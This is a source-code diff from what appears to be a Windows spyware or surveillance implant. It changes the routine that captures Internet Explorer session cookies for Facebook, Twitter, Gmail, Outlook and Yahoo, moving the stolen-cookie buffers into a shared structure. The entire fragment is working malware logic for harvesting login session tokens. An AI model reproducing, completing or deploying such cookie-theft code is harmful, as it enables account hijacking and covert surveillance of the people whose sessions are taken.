@@ -552,7 +552,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	DWORD origin = COOKIE_MASK;
-	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(char);
+	DWORD size = sizeof(shared.FACEBOOK_IE_COOKIE)-sizeof(char);
 	origin = dwFlags & (~origin);
 
 	if (dwLen < 4)
@@ -564,24 +564,24 @@ DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETI
 			size = dwLen;
 
 		if (origin == COOKIE_FACEBOOK) {
-			ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));	
-			memcpy(FACEBOOK_IE_COOKIE, msg, size);
+			ZeroMemory(shared.FACEBOOK_IE_COOKIE, sizeof(shared.FACEBOOK_IE_COOKIE));
+			memcpy(shared.FACEBOOK_IE_COOKIE, msg, size);
 
 		} else if (origin == COOKIE_TWITTER) {
-			ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
-			memcpy(TWITTER_IE_COOKIE, msg, size);
+			ZeroMemory(shared.TWITTER_IE_COOKIE, sizeof(shared.TWITTER_IE_COOKIE));
+			memcpy(shared.TWITTER_IE_COOKIE, msg, size);
 
 		} else if (origin == COOKIE_GMAIL) {
-			ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
-			memcpy(GMAIL_IE_COOKIE, msg, size);
+			ZeroMemory(shared.GMAIL_IE_COOKIE, sizeof(shared.GMAIL_IE_COOKIE));
+			memcpy(shared.GMAIL_IE_COOKIE, msg, size);
 
 		} else if (origin == COOKIE_OUTLOOK) {
-			ZeroMemory(OUTLOOK_IE_COOKIE, sizeof(OUTLOOK_IE_COOKIE));
-			memcpy(OUTLOOK_IE_COOKIE, msg, size);
+			ZeroMemory(shared.OUTLOOK_IE_COOKIE, sizeof(shared.OUTLOOK_IE_COOKIE));
+			memcpy(shared.OUTLOOK_IE_COOKIE, msg, size);
 
 		} else if (origin == COOKIE_YAHOO) {
-			ZeroMemory(YAHOO_IE_COOKIE, sizeof(YAHOO_IE_COOKIE));
-			memcpy(YAHOO_IE_COOKIE, msg, size);
+			ZeroMemory(shared.YAHOO_IE_COOKIE, sizeof(shared.YAHOO_IE_COOKIE));
+			memcpy(shared.YAHOO_IE_COOKIE, msg, size);
 		} 
 
 		return 1;
